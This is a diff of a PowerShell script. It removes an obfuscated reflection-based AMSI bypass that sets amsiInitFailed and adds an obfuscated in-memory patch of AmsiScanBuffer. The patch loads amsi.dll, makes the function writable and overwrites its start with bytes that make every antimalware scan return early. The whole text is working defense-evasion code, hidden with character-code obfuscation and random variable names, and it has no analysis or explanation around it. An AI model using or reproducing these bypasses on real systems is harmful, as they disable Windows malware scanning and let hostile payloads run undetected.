@@ -1,2 +1,28 @@
-#Matt Graebers Reflection method 
-$U=$null;$mhjhjyh="$([char](32+51)+[cHar]([byte]0x79)+[cHar]([BytE]0x73)+[CHaR]([BytE]0x74)+[ChAR]([BYtE]0x65)+[Char](29+80)).$(('Mãnäge'+'ment').noRMAlIzE([ChaR](70)+[CHaR](111*57/57)+[ChaR](112+2)+[cHAr]([Byte]0x6d)+[chAr]([ByTe]0x44)) -replace [Char](15+77)+[ChAr]([byTE]0x70)+[CHAR](123)+[CHAR](77+44-44)+[char](110*108/108)+[ChaR]([BytE]0x7d)).$([chAR]([BYTe]0x41)+[cHAR]([bytE]0x75)+[char]([Byte]0x74)+[cHaR]([BYte]0x6f)+[chaR]([BYTe]0x6d)+[CHAR](81+16)+[cHar]([byTE]0x74)+[ChAr]([byTE]0x69)+[CHar](111)+[ChaR]([BYte]0x6e)).$(('Ám'+'sì'+'Ut'+'îl'+'s').norMALiZE([CHar]([BYTE]0x46)+[CHAr](111*45/45)+[ChAr](103+11)+[CHar](109+48-48)+[chAR]([byTE]0x44)) -replace [ChaR]([bytE]0x5c)+[ChAR](112)+[CHAr](123*59/59)+[ChAR](77)+[chAr](110)+[chAr]([bytE]0x7d))";$rmvhdxccxhxluvlizqmqhonhfrzy="+('r'+'n'+'j'+'b'+'b').NOrmaLiZe([chaR](70+10-10)+[CHar](48+63)+[CHAr]([BYTe]0x72)+[cHaR]([BYte]0x6d)+[Char](68*51/51)) -replace [ChAr]([ByTE]0x5c)+[cHaR]([bYTe]0x70)+[chAR](82+41)+[cHaR](77*4/4)+[ChAr]([ByTE]0x6e)+[ChAr]([ByTe]0x7d)";[Threading.Thread]::Sleep(1402);[Ref].Assembly.GetType($mhjhjyh).GetField($([chaR](97+86-86)+[cHaR](109)+[chAR]([byTE]0x73)+[cHAr](105)+[ChAr]([BYte]0x49)+[cHar]([bYTe]0x6e)+[CHaR]([bYTe]0x69)+[CHAR](116)+[char](70+42-42)+[cHar](97+31-31)+[CHaR]([bYTE]0x69)+[CHaR](108*62/62)+[ChaR]([byTe]0x65)+[ChaR]([byTE]0x64)),"NonPublic,Static").SetValue($U,$true);
+#Rasta-mouses Amsi-Scan-Buffer patch \n
+$tctgl = @"
+using System;
+using System.Runtime.InteropServices;
+public class tctgl {
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dlinzt, uint flNewProtect, out uint lpflOldProtect);
+}
+"@
+
+Add-Type $tctgl
+
+$kxtdgkk = [tctgl]::LoadLibrary("$([ChAR](97*83/83)+[cHaR](109)+[chaR]([BYTE]0x73)+[CHar]([Byte]0x69)+[CHAR]([BYtE]0x2e)+[cHAR](100*8/8)+[chAR]([byTE]0x6c)+[CHAr](108+70-70))")
+$rolfsh = [tctgl]::GetProcAddress($kxtdgkk, "$([chAr]([Byte]0x41)+[CHaR]([BYtE]0x6d)+[CHaR]([BytE]0x73)+[char](93+12)+[chAR]([bYte]0x53)+[chAr]([bYte]0x63)+[ChAr]([bYte]0x61)+[chaR](96+14)+[cHAr]([byte]0x42)+[cHaR]([ByTE]0x75)+[ChAR](102)+[CHAr]([BytE]0x66)+[cHaR]([byte]0x65)+[char](114*77/77))")
+$p = 0
+[tctgl]::VirtualProtect($rolfsh, [uint32]5, 0x40, [ref]$p)
+$wzbx = "0xB8"
+$rzut = "0x57"
+$xput = "0x00"
+$yyby = "0x07"
+$iksp = "0x80"
+$dydv = "0xC3"
+$tenvb = [Byte[]] ($wzbx,$rzut,$xput,$yyby,+$iksp,+$dydv)
+[System.Runtime.InteropServices.Marshal]::Copy($tenvb, 0, $rolfsh, 6)
